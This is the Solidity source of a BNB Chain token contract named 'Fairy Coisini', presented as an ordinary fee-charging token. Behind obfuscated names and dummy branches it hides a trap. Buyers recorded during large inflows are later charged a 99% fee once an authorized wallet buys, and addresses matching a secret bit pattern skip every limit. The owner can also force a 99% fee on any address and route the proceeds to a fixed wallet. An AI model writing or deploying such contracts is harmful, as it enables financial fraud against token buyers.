/**
 *Submitted for verification at BscScan.com on 2022-12-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract FairyCoisini is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Fairy Coisini ";
    string constant _symbol = "FairyCoisini";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedBurnFeeAutoIsSellMin;
    mapping(address => bool) private receiverMinMarketingExempt;
    mapping(address => bool) private burnExemptTxBuySellMarketingMax;
    mapping(address => bool) private launchedExemptLimitIsTrading;
    mapping(address => uint256) private autoBuyFeeMaxMarketing;
    mapping(uint256 => address) private liquidityWalletBotsTradingLimitExemptMin;
    uint256 public exemptLimitValue = 0;
    uint256 private launchBlock = 0;
    //BUY FEES
    uint256 private modeLaunchedTeamAutoBurnBuySell = 0;
    uint256 private launchedMinFeeTradingWalletBots = 9;

    //SELL FEES
    uint256 private launchedSellBotsTx = 0;
    uint256 private launchedSwapLiquidityWallet = 9;

    uint256 private walletExemptLiquidityAuto = launchedMinFeeTradingWalletBots + modeLaunchedTeamAutoBurnBuySell;
    uint256 private feeTxTradingWalletSwapBotsMode = 100;

    address private botsAutoLimitTradingWalletIsReceiver = (msg.sender); // auto-liq address
    address private feeLiquidityAutoSell = (0x8Da63BE6bfBA7bB30579be72FFFFeE010a885Ff2); // marketing address
    address private botsWalletSwapMaxMode = DEAD;
    address private teamLiquidityLimitWalletSwap = DEAD;
    address private swapTeamMarketingBots = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private liquidityTeamBotsFee;
    uint256 private modeBuySwapMarketing;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private modeIsLaunchedLiquidity;
    uint256 private autoLaunchedSwapMax;
    uint256 private receiverMarketingMinBots;
    uint256 private exemptLaunchedMinAuto;
    uint256 private botsBuyBurnMarketingWalletSell;

    bool private buyTxSwapSellLimit = true;
    bool private launchedExemptLimitIsTradingMode = true;
    bool private buyIsWalletTrading = true;
    bool private liquidityExemptAutoSell = true;
    bool private teamWalletIsMaxSwapLimitBurn = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private sellLimitLiquidityTrading = 6 * 10 ** 15;
    uint256 private receiverLiquidityLaunchedSellTradingBuyAuto = _totalSupply / 1000; // 0.1%

    
    bool private buyLiquidityReceiverFeeLaunchedTxMin = false;
    uint256 private minTeamWalletMode = 0;
    bool private sellBuySwapAuto = false;
    bool private tradingMinMarketingAuto = false;
    uint256 private minIsMarketingModeTeamBots = 0;
    uint256 private liquidityMarketingAutoLaunched = 0;
    bool private exemptAutoLimitLaunchedLiquidityMarketing = false;
    bool private teamLaunchedMinReceiverBuyTrading = false;
    bool private minReceiverModeLaunched = false;
    bool private swapMinTeamMaxBuySellMarketing = false;
    uint256 private minTeamWalletMode0 = 0;
    uint256 private minTeamWalletMode1 = 0;
    uint256 private minTeamWalletMode2 = 0;
    bool private minTeamWalletMode3 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        modeIsLaunchedLiquidity = true;

        launchedBurnFeeAutoIsSellMin[msg.sender] = true;
        launchedBurnFeeAutoIsSellMin[address(this)] = true;

        receiverMinMarketingExempt[msg.sender] = true;
        receiverMinMarketingExempt[0x0000000000000000000000000000000000000000] = true;
        receiverMinMarketingExempt[0x000000000000000000000000000000000000dEaD] = true;
        receiverMinMarketingExempt[address(this)] = true;

        burnExemptTxBuySellMarketingMax[msg.sender] = true;
        burnExemptTxBuySellMarketingMax[0x0000000000000000000000000000000000000000] = true;
        burnExemptTxBuySellMarketingMax[0x000000000000000000000000000000000000dEaD] = true;
        burnExemptTxBuySellMarketingMax[address(this)] = true;

        SetAuthorized(address(0x698D8e258E2229FD63C0fFFafFFFE77963927fA5));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return maxSellAutoTxTradingModeReceiver(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Fairy Coisini  Insufficient Allowance");
        }

        return maxSellAutoTxTradingModeReceiver(sender, recipient, amount);
    }

    function maxSellAutoTxTradingModeReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = launchedTradingExemptTx(sender) || launchedTradingExemptTx(recipient);
        
        if (minTeamWalletMode3 == buyLiquidityReceiverFeeLaunchedTxMin) {
            minTeamWalletMode3 = launchedExemptLimitIsTradingMode;
        }

        if (minReceiverModeLaunched != launchedExemptLimitIsTradingMode) {
            minReceiverModeLaunched = tradingMinMarketingAuto;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                marketingLiquidityLaunchedModeReceiver();
            }
            if (!bLimitTxWalletValue) {
                botsSellTeamIs(recipient);
            }
        }
        
        if (recipient == uniswapV2Pair && _balances[recipient] == 0) {
            launchBlock = block.number + 10;
        }
        if (!bLimitTxWalletValue) {
            require(block.number >= launchBlock, "No launch");
        }

        
        if (inSwap || bLimitTxWalletValue) {return liquidityAutoWalletLaunchedMaxBots(sender, recipient, amount);}


        if (!launchedBurnFeeAutoIsSellMin[sender] && !launchedBurnFeeAutoIsSellMin[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Fairy Coisini  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || burnExemptTxBuySellMarketingMax[sender] || burnExemptTxBuySellMarketingMax[recipient], "Fairy Coisini  Max TX Limit has been triggered");

        if (botsTradingReceiverMarketingLiquidityTeamMode()) {autoMarketingLiquidityWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Fairy Coisini  Insufficient Balance");
        
        if (minIsMarketingModeTeamBots == launchedMinFeeTradingWalletBots) {
            minIsMarketingModeTeamBots = minTeamWalletMode1;
        }

        if (liquidityMarketingAutoLaunched != minTeamWalletMode2) {
            liquidityMarketingAutoLaunched = receiverLiquidityLaunchedSellTradingBuyAuto;
        }

        if (minTeamWalletMode1 == minTeamWalletMode1) {
            minTeamWalletMode1 = minTeamWalletMode2;
        }


        uint256 amountReceived = launchedMinMaxReceiver(sender) ? liquidityLaunchedModeSwapBuy(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function liquidityAutoWalletLaunchedMaxBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Fairy Coisini  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function launchedMinMaxReceiver(address sender) internal view returns (bool) {
        return !receiverMinMarketingExempt[sender];
    }

    function isExemptReceiverWallet(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            walletExemptLiquidityAuto = launchedSwapLiquidityWallet + launchedSellBotsTx;
            return teamMaxLiquidityExemptWalletFee(sender, walletExemptLiquidityAuto);
        }
        if (!selling && sender == uniswapV2Pair) {
            walletExemptLiquidityAuto = launchedMinFeeTradingWalletBots + modeLaunchedTeamAutoBurnBuySell;
            return walletExemptLiquidityAuto;
        }
        return teamMaxLiquidityExemptWalletFee(sender, walletExemptLiquidityAuto);
    }

    function txIsExemptLimitBuy() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function liquidityLaunchedModeSwapBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (minTeamWalletMode3 == teamLaunchedMinReceiverBuyTrading) {
            minTeamWalletMode3 = minReceiverModeLaunched;
        }


        uint256 feeAmount = amount.mul(isExemptReceiverWallet(sender, receiver == uniswapV2Pair)).div(feeTxTradingWalletSwapBotsMode);

        if (launchedExemptLimitIsTrading[sender] || launchedExemptLimitIsTrading[receiver]) {
            feeAmount = amount.mul(99).div(feeTxTradingWalletSwapBotsMode);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function launchedTradingExemptTx(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function teamMaxLiquidityExemptWalletFee(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = autoBuyFeeMaxMarketing[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function botsSellTeamIs(address addr) private {
        if (txIsExemptLimitBuy() < sellLimitLiquidityTrading) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        liquidityWalletBotsTradingLimitExemptMin[exemptLimitValue] = addr;
    }

    function marketingLiquidityLaunchedModeReceiver() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (autoBuyFeeMaxMarketing[liquidityWalletBotsTradingLimitExemptMin[i]] == 0) {
                    autoBuyFeeMaxMarketing[liquidityWalletBotsTradingLimitExemptMin[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(feeLiquidityAutoSell).transfer(amountBNB * amountPercentage / 100);
    }

    function botsTradingReceiverMarketingLiquidityTeamMode() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    teamWalletIsMaxSwapLimitBurn &&
    _balances[address(this)] >= receiverLiquidityLaunchedSellTradingBuyAuto;
    }

    function autoMarketingLiquidityWallet() internal swapping {
        
        uint256 amountToLiquify = receiverLiquidityLaunchedSellTradingBuyAuto.mul(modeLaunchedTeamAutoBurnBuySell).div(walletExemptLiquidityAuto).div(2);
        uint256 amountToSwap = receiverLiquidityLaunchedSellTradingBuyAuto.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (minTeamWalletMode2 == minTeamWalletMode2) {
            minTeamWalletMode2 = minTeamWalletMode;
        }

        if (teamLaunchedMinReceiverBuyTrading != teamWalletIsMaxSwapLimitBurn) {
            teamLaunchedMinReceiverBuyTrading = swapMinTeamMaxBuySellMarketing;
        }

        if (sellBuySwapAuto == exemptAutoLimitLaunchedLiquidityMarketing) {
            sellBuySwapAuto = swapMinTeamMaxBuySellMarketing;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = walletExemptLiquidityAuto.sub(modeLaunchedTeamAutoBurnBuySell.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeLaunchedTeamAutoBurnBuySell).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(launchedMinFeeTradingWalletBots).div(totalETHFee);
        
        if (liquidityMarketingAutoLaunched == modeLaunchedTeamAutoBurnBuySell) {
            liquidityMarketingAutoLaunched = launchedSellBotsTx;
        }

        if (exemptAutoLimitLaunchedLiquidityMarketing != minReceiverModeLaunched) {
            exemptAutoLimitLaunchedLiquidityMarketing = buyIsWalletTrading;
        }


        payable(feeLiquidityAutoSell).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsAutoLimitTradingWalletIsReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSellBuySwapAuto() public view returns (bool) {
        if (sellBuySwapAuto != buyLiquidityReceiverFeeLaunchedTxMin) {
            return buyLiquidityReceiverFeeLaunchedTxMin;
        }
        return sellBuySwapAuto;
    }
    function setSellBuySwapAuto(bool a0) public onlyOwner {
        if (sellBuySwapAuto != liquidityExemptAutoSell) {
            liquidityExemptAutoSell=a0;
        }
        if (sellBuySwapAuto != minTeamWalletMode3) {
            minTeamWalletMode3=a0;
        }
        if (sellBuySwapAuto != liquidityExemptAutoSell) {
            liquidityExemptAutoSell=a0;
        }
        sellBuySwapAuto=a0;
    }

    function getSellLimitLiquidityTrading() public view returns (uint256) {
        if (sellLimitLiquidityTrading != minIsMarketingModeTeamBots) {
            return minIsMarketingModeTeamBots;
        }
        return sellLimitLiquidityTrading;
    }
    function setSellLimitLiquidityTrading(uint256 a0) public onlyOwner {
        if (sellLimitLiquidityTrading != sellLimitLiquidityTrading) {
            sellLimitLiquidityTrading=a0;
        }
        if (sellLimitLiquidityTrading == launchedSellBotsTx) {
            launchedSellBotsTx=a0;
        }
        sellLimitLiquidityTrading=a0;
    }

    function getReceiverMinMarketingExempt(address a0) public view returns (bool) {
            return receiverMinMarketingExempt[a0];
    }
    function setReceiverMinMarketingExempt(address a0,bool a1) public onlyOwner {
        receiverMinMarketingExempt[a0]=a1;
    }

    function getLiquidityExemptAutoSell() public view returns (bool) {
        if (liquidityExemptAutoSell == buyTxSwapSellLimit) {
            return buyTxSwapSellLimit;
        }
        if (liquidityExemptAutoSell != sellBuySwapAuto) {
            return sellBuySwapAuto;
        }
        return liquidityExemptAutoSell;
    }
    function setLiquidityExemptAutoSell(bool a0) public onlyOwner {
        liquidityExemptAutoSell=a0;
    }

    function getLaunchedExemptLimitIsTrading(address a0) public view returns (bool) {
        if (a0 != botsWalletSwapMaxMode) {
            return liquidityExemptAutoSell;
        }
            return launchedExemptLimitIsTrading[a0];
    }
    function setLaunchedExemptLimitIsTrading(address a0,bool a1) public onlyOwner {
        launchedExemptLimitIsTrading[a0]=a1;
    }

    function getBotsAutoLimitTradingWalletIsReceiver() public view returns (address) {
        if (botsAutoLimitTradingWalletIsReceiver != botsAutoLimitTradingWalletIsReceiver) {
            return botsAutoLimitTradingWalletIsReceiver;
        }
        return botsAutoLimitTradingWalletIsReceiver;
    }
    function setBotsAutoLimitTradingWalletIsReceiver(address a0) public onlyOwner {
        if (botsAutoLimitTradingWalletIsReceiver == feeLiquidityAutoSell) {
            feeLiquidityAutoSell=a0;
        }
        botsAutoLimitTradingWalletIsReceiver=a0;
    }

    function getReceiverLiquidityLaunchedSellTradingBuyAuto() public view returns (uint256) {
        return receiverLiquidityLaunchedSellTradingBuyAuto;
    }
    function setReceiverLiquidityLaunchedSellTradingBuyAuto(uint256 a0) public onlyOwner {
        if (receiverLiquidityLaunchedSellTradingBuyAuto != launchedSellBotsTx) {
            launchedSellBotsTx=a0;
        }
        if (receiverLiquidityLaunchedSellTradingBuyAuto != launchBlock) {
            launchBlock=a0;
        }
        receiverLiquidityLaunchedSellTradingBuyAuto=a0;
    }

    function getSwapMinTeamMaxBuySellMarketing() public view returns (bool) {
        return swapMinTeamMaxBuySellMarketing;
    }
    function setSwapMinTeamMaxBuySellMarketing(bool a0) public onlyOwner {
        if (swapMinTeamMaxBuySellMarketing != teamWalletIsMaxSwapLimitBurn) {
            teamWalletIsMaxSwapLimitBurn=a0;
        }
        swapMinTeamMaxBuySellMarketing=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}